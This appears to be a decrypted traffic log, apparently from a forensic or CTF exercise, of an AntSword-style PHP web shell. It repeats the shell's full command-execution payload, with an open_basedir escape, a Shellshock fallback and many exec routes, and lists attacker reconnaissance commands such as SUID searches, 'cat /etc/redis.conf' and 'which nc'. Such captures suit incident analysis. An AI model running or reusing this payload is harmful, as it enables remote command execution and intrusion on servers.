",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51192
解密数据：
cd "/";whoami;echo 0ca0765e;pwd;echo 36a714

流量编号: 51192
解密数据：
/bin/sh

流量编号: 51192
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.1e95f54";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "6d19"."8610";echo @asenc($output);echo "be7f"."6863";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51237
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.2536bff5e";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "0f40"."6c4d";echo @asenc($output);echo "9ea"."a048";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51237
解密数据：
cd "/";find / -perm -4000 2>/dev/null;echo 0ca0765e;pwd;echo 36a714

流量编号: 51237
解密数据：
/bin/sh

流量编号: 51275
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.bbde51a1cc1";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "fc378"."e3a15";echo @asenc($output);echo "afa"."e29";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51275
解密数据：
cd "/";uname -a;echo 0ca0765e;pwd;echo 36a714

流量编号: 51275
解密数据：
/bin/sh

流量编号: 51289
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.9e443b49d6df";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "ec"."725";echo @asenc($output);echo "ee76"."206a";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51289
解密数据：
cd "/";ps -ef;echo 0ca0765e;pwd;echo 36a714

流量编号: 51289
解密数据：
/bin/sh

流量编号: 51307
解密数据：
cd "/";netstat -lntp;echo 0ca0765e;pwd;echo 36a714

流量编号: 51307
解密数据：
/bin/sh

流量编号: 51307
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.2be6cd1fae82";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "366489"."201ed5";echo @asenc($output);echo "7a"."ec3";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51519
解密数据：
cd "/";redis-server --version;echo 0ca0765e;pwd;echo 36a714

流量编号: 51519
解密数据：
/bin/sh

流量编号: 51519
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.43ccb0350";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "276e"."a041";echo @asenc($output);echo "5cd"."0de";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51541
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.bdc7c";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "998d"."b282c";echo @asenc($output);echo "ae06"."47343";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 51541
解密数据：
cd "/";cat /etc/redis.conf;echo 0ca0765e;pwd;echo 36a714

流量编号: 51541
解密数据：
/bin/sh

流量编号: 51666
解密数据：
cd "/";which nc;echo 0ca0765e;pwd;echo 36a714

流量编号: 51666
解密数据：
/bin/sh

流量编号: 51666
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.f546a5b965";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "f7010"."b2410";echo @asenc($output);echo "ce1372"."dc2d97";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
